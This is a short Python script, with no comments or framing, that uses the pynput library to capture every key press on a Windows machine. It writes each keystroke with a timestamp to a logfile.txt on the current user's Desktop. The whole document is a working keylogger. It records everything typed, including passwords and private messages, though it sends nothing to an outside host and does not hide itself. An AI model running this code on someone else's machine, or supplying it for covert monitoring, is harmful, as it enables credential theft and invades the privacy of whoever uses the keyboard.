from pynput.keyboard import Listener
import os
import logging

username = os.getlogin()
logging_dir = f"C:/Users/{username}/Desktop"

logging.basicConfig(filename=f"{logging_dir}/logfile.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def keyHandler(key):
    logging.info(key)

with Listener(on_press=keyHandler) as listner:
    listner.join()